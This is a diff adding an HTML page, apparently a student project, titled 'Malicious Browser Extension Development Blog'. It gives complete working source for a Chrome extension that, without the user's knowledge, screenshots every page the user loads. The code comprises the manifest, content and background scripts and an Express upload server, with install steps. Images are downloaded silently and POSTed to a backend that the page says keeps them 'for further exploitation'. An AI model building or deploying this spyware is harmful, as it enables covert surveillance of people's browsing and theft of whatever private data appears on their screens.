@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Browser Extension Blog</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <header>
+        <h1>Malicious Browser Extension Development Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="#about">About</a></li>
+                <li><a href="#extension">Extension</a></li>
+                <li><a href="#backend">Backend</a></li>
+                <li><a href="#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <section id="about">
+            <h2>About</h2>
+            <p>The Screen Capture Extension is a browser extension designed with malicious intent. Its primary function is to secretly capture screenshots of webpages visited by users without their knowledge or consent. These screenshots are then saved locally on the user's device and transmitted to a remote server for further exploitation. This document aims to provide a comprehensive understanding of how the extension works and the potential risks it poses to users' privacy and security.</p>
+        
+            <h3>Installation</h3>
+            <ul>
+                <li>Download the extension files from the provided source.</li>
+                <li>Open your browser and navigate to the extensions management page.</li>
+                <li>Enable developer mode.</li>
+                <li>Click on "Load unpacked" and select the directory containing the extension files.</li>
+                <li>The extension should now be installed and ready to use.</li>
+            </ul>
+        
+            <h3>Extension Components</h3>
+            <p>The Screen Capture Extension consists of three main components:</p>
+            <ul>
+                <li>
+                    <h4>Manifest File (manifest.json)</h4>
+                    <p>The manifest file defines the extension's metadata and functionality. Key attributes include:</p>
+                    <ul>
+                        <li>"manifest_version": Specifies the version of the manifest file format.</li>
+                        <li>"name": The name of the extension.</li>
+                        <li>"version": The version number.</li>
+                        <li>"description": A brief description of the extension.</li>
+                        <li>"host_permissions": Permissions required by the extension, such as accessing webpages and tabs.</li>
+                        <li>"permissions": Additional permissions required, such as storage and notifications.</li>
+                        <li>"background": Specifies the background script.</li>
+                        <li>"content_scripts": Defines content scripts injected into webpages.</li>
+                    </ul>
+                </li>
+                <li>
+                    <h4>Content Script (content.js)</h4>
+                    <p>The content script runs in the context of webpages visited by the user. Its main function is to listen for messages from the background script and trigger the download of screenshots. When instructed, it captures the visible tab's screenshot and sends it to the background script for processing.</p>
+                </li>
+                <li>
+                    <h4>Background Script (background.js)</h4>
+                    <p>The background script serves as the central component of the extension. It is responsible for coordinating communication between content scripts, handling screenshot capture, and transmitting data to the backend server. It listens for tab updates and triggers the capture of screenshots when webpages are fully loaded.</p>
+                </li>
+            </ul>
+        
+            <h2>Browser Extension</h2>
+            <p>Provide an overview of the extension, its functionality, and how it works.</p>
+            <p>Include the manifest file, content script, and background script.</p>
+            <pre><code class="language-javascript">
+        // Insert your extension code here
+        {
+            "manifest_version": 3,
+            "name": "Screen Capture Extension",
+            "version": "1.0",
+            "description": "A browser extension to capture and download screenshots.",
+            "host_permissions": [
+              
+              "http://*/*",
+              "https://*/*",
+              "https://google.com/*",
+              "<all_urls>"
+            ],
+            "permissions": [
+            
+              "tabs",
+              "storage",
+              "notifications",
+              "webNavigation",
+              "scripting",
+              "downloads"
+            ],
+            "background": {
+              "service_worker": "background.js"
+            },
+            "content_scripts": [{
+              "matches": ["<all_urls>"],
+              "js": ["content.js"]
+            }]
+          }
+          
+        </code></pre>
+        <h3> Content.js</h3>
+        <p>The content script runs in the context of webpages visited by the user. Its main function is to listen for messages from the background script and trigger the download of screenshots. When instructed, it captures the visible tab's screenshot and sends it to the background script for processing.</p>
+            <pre><code class="language-javascript">
+                console.log("content.js is called");
+        
+                chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
+                
+                if (message.action === "downloadScreenshot") {
+                // Retrieve the data URL of the screenshot from the message
+                
+                    var dataUrl = message.dataUrl;
+                    console.log(dataUrl);
+                // Use chrome.downloads API to download the screenshot without showing the notification
+                chrome.downloads.download({
+                     url: dataUrl,
+                     filename: "screenshot.png",
+                     saveAs: false  // Set to false to avoid showing the popup notification
+                 });
+                
+                  }
+                 });
+                
+                </code>
+
+       </pre>
+        </section>
+        
+        <section id="extension">
+            <h3> Background.js</h3>
+            <p>The background script serves as the central component of the extension. It is responsible for coordinating communication between content scripts, handling screenshot capture, and transmitting data to the backend server. It listens for tab updates and triggers the capture of screenshots when webpages are fully loaded.</p>
+            <pre><code> 
+                chrome.runtime.onInstalled.addListener(function() {
+                    console.log("Extension installed");
+                });
+                
+                console.log("Bk.js is called");
+                
+                chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
+                    if (changeInfo.status === "complete") {
+                        console.log("update trigger")
+                        // Delay sending the message to ensure content script is injected
+                        setTimeout(function() {
+                            captureAndDownloadScreenshot(tabId);
+                        }, 1000); // Adjust delay as needed
+                    }
+                });
+                
+                function captureAndDownloadScreenshot(tabId) {
+                
+                
+                    chrome.tabs.captureVisibleTab(null, { format: "png" }, function(dataUrl) {
+                        console.log("captureScreenshot function called")
+                        // print("captureScreenshot function called")
+                        if (!dataUrl) {
+                            console.error("Error: Unable to capture screenshot.");
+                            return;
+                        }
+                        
+                        console.log(dataUrl);
+                        sendScreenshotToBackend(dataUrl); // Send the screenshot to backend
+                    });
+                }
+                
+                // Function to send screenshot data to the backend
+                function sendScreenshotToBackend(dataUrl) {
+                    fetch('http://localhost:2000/upload-screenshot', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ dataUrl })
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error(`HTTP error! Status: ${response.status}`);
+                        }
+                        console.log("Screenshot sent to backend successfully");
+                    })
+                    .catch(error => {
+                        console.error("Error sending screenshot:", error.message);
+                    });
+                }
+                
+            </code></pre>
+        
+        </section>
+        
+        <section id="backend">
+            <h2>Backend</h2>
+            <p>Explain the backend code for handling screenshot uploads.</p>
+            <pre><code class="language-javascript">
+ <h3>Backend.js</h3>             
+const express = require('express');
+const cors = require('cors');
+const bodyParser = require('body-parser');
+const fs = require('fs');
+const path = require('path'); // Import the path module
+
+const app = express();
+const port = 2000;
+
+// Specify the directory where you want to save the images
+const desktopPath = path.join(require('os').homedir(), 'Desktop'); // Get the path to the desktop
+const uploadDirectory = path.join(desktopPath, 'uploads'); // Create a path for the uploads directory
+
+// Ensure that the specified directory exists
+if (!fs.existsSync(uploadDirectory)) {
+    fs.mkdirSync(uploadDirectory);
+}
+
+// Enable CORS
+app.use(cors());
+
+// Middleware to parse JSON bodies
+app.use(bodyParser.json({ limit: '10mb' }));
+
+// Endpoint to handle screenshot uploads
+app.post('/upload-screenshot', (req, res) => {
+    const { dataUrl } = req.body;
+    
+    // Log the received image data on the server-side
+    console.log('Received screenshot:', dataUrl);
+
+    // Process the screenshot dataUrl here (optional)
+    // For example, you can decode the base64 data and save it to a file
+    // Ensure that you handle errors and edge cases appropriately
+
+    // Example: Saving the image to a file (synchronously)
+    try {
+        const imageData = dataUrl.split(';base64,').pop();
+        const fileName = `screenshot_${Date.now()}.png`;
+
+        // Specify the full path where you want to save the image
+        const filePath = path.join(uploadDirectory, fileName);
+
+        // Write the image data to the specified file path
+        fs.writeFileSync(filePath, imageData, { encoding: 'base64' });
+        console.log('Image saved as:', filePath);
+    } catch (error) {
+        console.error('Error saving image:', error);
+        // Respond with an error message
+        res.status(500).send('Error saving image');
+        return;
+    }
+
+    // Respond with a success message
+    res.status(200).send('Screenshot received successfully');
+});
+
+// Start the server
+app.listen(port, () => {
+    console.log(`Server is running on http://localhost:${port}`);
+});
+
+            </code></pre>
+        </section>
+        
+        <section>
+            <h3>Functionality</h3>
+            <ul>
+                <li>
+                    <h4>Screen Capture</h4>
+                    <p>When a webpage is fully loaded, the background script triggers the capture of a screenshot using the chrome.tabs.captureVisibleTab API. The resulting data URL of the screenshot is then passed to the content script for further processing.</p>
+                </li>
+                <li>
+                    <h4>Data Transmission</h4>
+                    <p>The content script receives the screenshot data URL and sends it to the background script via message passing. The background script then transmits the screenshot data to a remote backend server using a POST request.</p>
+                </li>
+                <li>
+                    <h4>Backend Handling</h4>
+                    <p>The backend server receives the screenshot data and decodes it from base64 format. It then saves the screenshot image locally on the server for further exploitation. The server responds with a success message upon successful receipt and processing of the screenshot.</p>
+                </li>
+            </ul>
+        </section>
+        <section>
+            <h3>Demo</h3>
+            <section>
+                <iframe width="560" height="315" src="https://www.youtube.com/watch?v=iHsMsDjM_FU&t=41s" frameborder="0" allowfullscreen></iframe>
+            
+        </section>
+            
+        </section>
+        </main>
+        
+
+        <section id="contact">
+            <h2>Contact</h2>
+            <p>2022pct0019@iitjammu.ac.in</p>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 Malicious Browser Extension Blog</p>
+    </footer>
+
+    <script src="scripts.js"></script>
+</body>
+
+</html>
